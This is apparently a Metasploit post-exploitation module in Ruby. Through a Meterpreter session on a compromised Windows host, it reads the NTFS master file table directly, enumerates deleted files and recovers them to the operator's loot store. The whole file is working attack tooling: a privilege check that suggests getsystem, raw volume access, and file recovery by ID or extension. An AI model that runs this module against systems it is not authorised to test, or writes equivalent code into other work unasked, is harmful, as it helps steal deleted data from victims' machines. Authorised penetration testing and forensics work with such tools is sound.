##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'         => 'Windows Gather Deleted Files Enumeration and Recovering',
      'Description'  => %q{
          This module list and try to recover deleted files from NTFS file systems. Use
        the FILES option to guide recovery. Let it empty to enumerate deleted files in the
        DRIVE. Set FILES to an extension (Ex. "pdf") to recover deleted files with that
        extension. Or set FILES to a comma separated list of IDs (from enumeration) to
        recover those files. The user must have into account file enumeration and recovery
        could take a long time, use the TIMEOUT option to abort enumeration or recovery by
        extension after that time (in seconds).
      },
      'License'      => MSF_LICENSE,
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => ['Borja Merino <bmerinofe[at]gmail.com>'],
      'References'   => [
        [ 'URL', 'http://www.youtube.com/watch?v=9yzCf360ujY&hd=1' ]
      ]
    ))
    register_options(
      [
        OptString.new('FILES',[false,'ID or extensions of the files to recover in a comma separated way. Let empty to enumerate deleted files.',""]),
        OptString.new('DRIVE',[true,'Drive you want to recover files from.',"C:"]),
        OptInt.new('TIMEOUT', [true,'Search timeout. If 0 the module will go through the entire $MFT.', 3600])
      ], self.class)
  end

  def run
    winver = sysinfo["OS"]

    if winver =~ /2000/i
      print_error("Module not valid for Windows 2000")
      return
    end

    drive = datastore['DRIVE']
    fs = file_system(drive)

    if fs !~ /ntfs/i
      print_error("The file system is not NTFS")
      return
    end

    if not is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    print_status("System Info - OS: #{winver}, Drive: #{drive}")
    type = datastore['FILES']
    files = type.split(',')
    # To extract files from its IDs
    if datastore['FILES'] != "" and is_numeric(files[0])
      r = client.railgun.kernel32.CreateFileA("\\\\.\\#{drive}", "GENERIC_READ", "FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING","FILE_FLAG_WRITE_THROUGH",0)
      if r['GetLastError'] == 0
        recover_file(files,r['return'])
        client.railgun.kernel32.CloseHandle(r['return'])
      else
        print_error("Error opening #{drive} GetLastError=#{r['GetLastError']}")
      end
    # To show deleted files (FILE="") or extract the type of file specified by extension
    else
      handle = get_mft_info(drive)
      if handle != nil
        data_runs = mft_data_runs(handle)
        vprint_status("It seems that MFT is fragmented (#{data_runs.size-1} data runs)") if (data_runs.count > 2)
        to = (datastore['TIMEOUT'].zero?) ? nil : datastore['TIMEOUT']
        begin
          ::Timeout.timeout(to) do
            deleted_files(data_runs[1..-1], handle,files)
          end
        rescue ::Timeout::Error
          print_error("Timed out after #{to} seconds. Skipping...")
        end
      end
    end
  end

  def get_high_low_values(offset)
    # Always positive values
    return [offset,0] if (offset < 0x1_0000_0000)
    # Strange Case. The MFT datarun would have to be really far
    return [offset & 0xffff_ffff, offset >> 32]
  end

  # Recover the content of the file/files requested
  def recover_file(offset,handle)
    ra = file_system_features(handle)
    # Offset could be in a comma separated list of IDs
    0.upto(offset.size - 1) { |i|
      val = get_high_low_values(offset[i].to_i)
      client.railgun.kernel32.SetFilePointer(handle,val[0],val[1],0)
      rf = client.railgun.kernel32.ReadFile(handle,1024,1024,4,nil)
      attributes = rf['lpBuffer'][56..-1]
      name = get_name(attributes)
      print_status("File to download: #{name}")
      vprint_status("Getting Data Runs ...")
      data = get_data_runs(attributes)
      if data == nil or name == nil
        print_error("There were problems to recover the file: #{name}")
        next
      end

      # If file is resident
      if data[0] == 0
        print_status ("The file is resident. Saving #{name} ... ")
        path = store_loot("resident.file", "application/octet-stream", session, data[1], name.downcase, nil)
        print_good("File saved on #{path}")

      # If file no resident
      else
        # Due to the size of the non-resident files we have to store small chunks of data as we go through each of the data runs
        # that make up the file (save_file function).
        size = get_size(rf['lpBuffer'][56..-1])
        print_status ("The file is not resident. Saving #{name} ... (#{size} bytes)")
        base = 0
        # Go through each of the data runs to save the file
        file_data = ""
        1.upto(data.count-1) { |i|
          datarun = get_datarun_location(data[i])
          base = base+datarun[0]
          size = save_file([base,datarun[1]],size,file_data,handle)
        }
        #file.close
        path = store_loot("nonresident.file", "application/octet-stream", session, file_data, name.downcase, nil)
        print_good("File saved on #{path}")
      end
    }
  end

  # Save the no resident file to disk
  def save_file(datarun,size,file_data,handle)
    ra = file_system_features(handle)
    bytes_per_cluster = ra['lpOutBuffer'][44,4].unpack("V*")[0]
    distance = get_high_low_values(datarun[0]*bytes_per_cluster)
    client.railgun.kernel32.SetFilePointer(handle,distance[0],distance[1],0)
    # Buffer chunks to store in disk. Modify this value as you wish.
    buffer_size = 8
    division = datarun[1]/buffer_size
    rest = datarun[1]%buffer_size
    vprint_status("Number of chunks: #{division}	Rest: #{rest} clusters	Chunk size: #{buffer_size} clusters ")
    if (division > 0)
      1.upto(division) { |i|
        if (size>bytes_per_cluster*buffer_size)
          rf = client.railgun.kernel32.ReadFile(handle,bytes_per_cluster*buffer_size,bytes_per_cluster*buffer_size,4,nil)
          file_data << rf['lpBuffer']
          size = size - bytes_per_cluster * buffer_size
          vprint_status("Save 1 chunk of #{buffer_size*bytes_per_cluster} bytes, there are #{size} left")
        # It's the last datarun
        else
          rf = client.railgun.kernel32.ReadFile(handle,bytes_per_cluster*buffer_size,bytes_per_cluster*buffer_size,4,nil)
          file_data << rf['lpBuffer'][0..size-1]
          vprint_status("Save 1 chunk of #{size} bytes")
        end
      }
    end

    if (rest > 0)
      # It's the last datarun
      if (size<rest*bytes_per_cluster)
        rf = client.railgun.kernel32.ReadFile(handle,rest*bytes_per_cluster,rest*bytes_per_cluster,4,nil)
        # Don't save the slack space
        file_data << rf['lpBuffer'][0..size-1]
        vprint_status("(Last datarun) Save 1 chunk of #{size}")
      else
        rf = client.railgun.kernel32.ReadFile(handle,bytes_per_cluster*rest,bytes_per_cluster*rest,4,nil)
        file_data << rf['lpBuffer']
        size = size - bytes_per_cluster * rest
        vprint_status("(No last datarun) Save 1 chunk of #{rest*bytes_per_cluster}, there are #{size} left")
      end
    end
    return size
  end

  # Get the logical cluster and the offset of each datarun
  def get_datarun_location(datarun)

    n_log_cluster = datarun.each_byte.first.divmod(16)[0]
    n_offset = datarun.each_byte.first.divmod(16)[1]

    log_cluster = datarun[-(n_log_cluster)..-1]
    offset = datarun[1..n_offset]

    log_cluster << "\x00" if (log_cluster.size % 2 != 0)
    offset << "\x00" if (offset.size % 2 != 0)
    # The logical cluster value could be negative so we need to get the 2 complement in those cases
    if log_cluster.size == 2
      int_log_cluster = log_cluster.unpack('s*')[0]
    elsif log_cluster.size == 4
      int_log_cluster = log_cluster.unpack('l')[0]
    end

    if offset.size == 2
      int_offset = offset.unpack('v*')[0]
    else
      int_offset = offset.unpack('V')[0]
    end
    return int_log_cluster,int_offset
  end

  # Go though the datarun and save the wanted files
  def go_over_mft(logc,offset,handle,files)
    dist=get_high_low_values(logc)
    client.railgun.kernel32.SetFilePointer(handle,dist[0],dist[1],0)
    1.upto(offset) { |i|
      # If FILE header and deleted file (\x00\x00)
      rf = client.railgun.kernel32.ReadFile(handle,1024,1024,4,nil)
      if (rf['lpBuffer'][0,4]=="\x46\x49\x4c\x45") and (rf['lpBuffer'][22,2] == "\x00\x00")
        name = get_name(rf['lpBuffer'][56..-1])
        if name!= nil
          print_status("Name: #{name}	ID: #{logc}")
          # If we want to save it according to the file extensions
          if files != "" and files.include? File.extname(name.capitalize)[1..-1]
            print_good("Hidden file found!")
            recover_file([logc.to_s],handle)
            dist=get_high_low_values(logc+1024)
            # We need to restore the pointer to the current MFT entry
            client.railgun.kernel32.SetFilePointer(handle,dist[0],dist[1],0)
          end
        end
      # MFT entry with no FILE '\x46\x49\x4c\x45' header or its not a deleted file (dir, file, deleted dir)
      else
        logc = logc + 1024
        next

      end
      logc = logc + 1024
    }
  end

  # Recieve the MFT data runs and list/save the deleted files
  # Useful cheat_sheet to understand the MFT structure:  http://www.writeblocked.org/resources/ntfs_cheat_sheets.pdf
  # Recap of each of the attributes: http://runenordvik.com/doc/MFT-table.pdf
  def deleted_files(data_runs,handle,files)
    ra = file_system_features(handle)
    bytes_per_cluster = ra['lpOutBuffer'][44,4].unpack("V*")[0]
    print_status("$MFT is made up of #{data_runs.size} dataruns")
    base = 0
    real_loc = []
    0.upto(data_runs.size - 1) { |i|
      datar_info = get_datarun_location(data_runs[i])
      base = base+datar_info[0]
      vprint_status("MFT data run #{i+1} is at byte #{base*bytes_per_cluster}. It has a total of #{datar_info[1]} clusters")
      # Add to the beginning
      real_loc.unshift([base*bytes_per_cluster,(bytes_per_cluster*datar_info[1])/1024])
    }

    # We start for the last data run to show quiet sooner deleted files
    0.upto(real_loc.size - 1) { |i|
      print_status("Searching deleted files in data run #{data_runs.size-i} ... ")
      go_over_mft(real_loc[i][0],real_loc[i][1],handle,files)
    }

    print_good("MFT entries finished")
    client.railgun.kernel32.CloseHandle(handle)
  end

  def get_name(entry)
    data_name = get_attribute(entry,"\x30\x00\x00\x00")
    return nil if data_name == nil
    length = data_name[88,1].unpack('H*')[0].to_i(16)
    return data_name[90,length*2].delete("\000")
  end

  def get_size(entry)
    data = get_attribute(entry,"\x80\x00\x00\x00")
    return if data == nil
    return data[48,8].unpack('Q*')[0]
  end

  # Gets the NTFS information and return a pointer to the beginning of the MFT
  def get_mft_info(drive)
    r = client.railgun.kernel32.CreateFileA("\\\\.\\#{drive}", "GENERIC_READ", "FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING","FILE_FLAG_WRITE_THROUGH",0)

    if r['GetLastError'] != 0
      print_error("Error opening #{drive} GetLastError=#{r['GetLastError']}")
      print_error("Try to get SYSTEM Privilege") if r['GetLastError'] == 5
      return nil
    else
      ra = file_system_features(r['return'])
      bytes_per_cluster = ra['lpOutBuffer'][44,4].unpack("V*")[0]
      mft_logical_offset = ra['lpOutBuffer'][64,8].unpack("V*")[0]
      offset_mft_bytes = mft_logical_offset * bytes_per_cluster
      vprint_status("Logical cluster : #{ra['lpOutBuffer'][64,8].unpack('h*')[0].reverse}")
      vprint_status("NTFS Volumen Serial Number: #{ra['lpOutBuffer'][0,8].unpack('h*')[0].reverse}")
      vprint_status("Bytes per Sector: #{ra['lpOutBuffer'][40,4].unpack('V*')[0]}")
      vprint_status("Bytes per Cluster: #{bytes_per_cluster}")
      vprint_status("Length of the MFT (bytes): #{ra['lpOutBuffer'][56,8].unpack('Q*')[0]}")
      vprint_status("Logical cluster where MTF starts #{mft_logical_offset}")
      # We set the pointer to the begining of the MFT
      client.railgun.kernel32.SetFilePointer(r['return'],offset_mft_bytes,0,0)
      return r['return']
    end
  end

  def file_system_features(handle)
    fsctl_get_ntfs_volume_data = 0x00090064
    return client.railgun.kernel32.DeviceIoControl(handle,fsctl_get_ntfs_volume_data,"",0,200,200,4,nil)
  end

  def mft_data_runs(handle)
    # Read the first entry of the MFT (the $MFT itself)
    rf = client.railgun.kernel32.ReadFile(handle,1024,1024,4,nil)
    # Return the list of data runs of the MFT
    return get_data_runs(rf['lpBuffer'][56..-1])
  end

  # Receive a string pointing to the first attribute of certain file entry and returns an array of data runs
  # of that file. The first element will be 1 or 0 depending on whether the attribute is resident or not. If it's resident
  # the second element will be the content itself, otherwise (if not resident) each element will contain  each of
  # the data runs of that file
  def get_data_runs(data)
    # We reach de DATA attribute
    data_runs = get_attribute(data,"\x80\x00\x00\x00")
    return nil if data_runs == nil
    print_status("File compressed/encrypted/sparse. Ignore this file if you get errors") if ["\x01\x00", "\x00\x40", "\x00\x80"].include? data_runs[12,2]
    # Check if the file is resident or not
    resident = data_runs[8,1]
    if resident =="\x00"
      inf = [0]
      inf << get_resident(data_runs)
      return inf
    else
      inf = [1]
      # Get the offset of the first data run from $DATA
      dist_datar = data_runs[32,2].unpack('v*')[0]
      data_run = data_runs[dist_datar..-1]
      # Get an array of data runs. If this array contains more than 1 element the file is fragmented.
      lengh_dr = data_run.each_byte.first.divmod(16)
      while (lengh_dr[0] !=0 && lengh_dr[1] != 0)
        chunk = data_run[0,lengh_dr[0]+lengh_dr[1]+1]
        inf << chunk
        data_run = data_run[lengh_dr[0]+lengh_dr[1]+1..-1]
        begin
        lengh_dr = data_run.each_byte.first.divmod(16)
        rescue
          return nil
        end
      end
      return inf
    end
  end

  # Get the content of the file when it's resident
  def get_resident(data)
    start = data[20,2].unpack('v*')[0]
    offset = data[16,4].unpack('V*')[0]
    return data[start,offset]
  end

  # Find the attribute requested in the file entry and returns a string with all the information of that attribute
  def get_attribute(str,code)
    0.upto(15) do |i|
      header = str[0,4]
      size_att = str[4,4].unpack('V*')[0]
      if header == code
        return str[0..size_att]
      else
        # To avoid not valid entries or the attribute doesn't not exist
        return nil if (size_att>1024) or header == "\xff\xff\xff\xff"
        str =  str[size_att..-1]
      end
    end
    print_status("Attribute not found")
    return nil
  end

  # Get the type of file system
  def file_system(drive)
    # BOOL WINAPI GetVolumeInformation(
    #  _In_opt_   LPCTSTR lpRootPathName,
    #  _Out_opt_  LPTSTR lpVolumeNameBuffer,
    #  _In_       DWORD nVolumeNameSize,
    #  _Out_opt_  LPDWORD lpVolumeSerialNumber,
    #  _Out_opt_  LPDWORD lpMaximumComponentLength,
    #  _Out_opt_  LPDWORD lpFileSystemFlags,
    #  _Out_opt_  LPTSTR lpFileSystemNameBuffer,
    #  _In_       DWORD nFileSystemNameSize)
    r = client.railgun.kernel32.GetVolumeInformationA("#{drive}//",nil,nil,nil,nil,nil,8,8)
    fs = r['lpFileSystemNameBuffer']
    return fs
  end

  def is_numeric(o)
    true if Integer(o) rescue false
  end
end
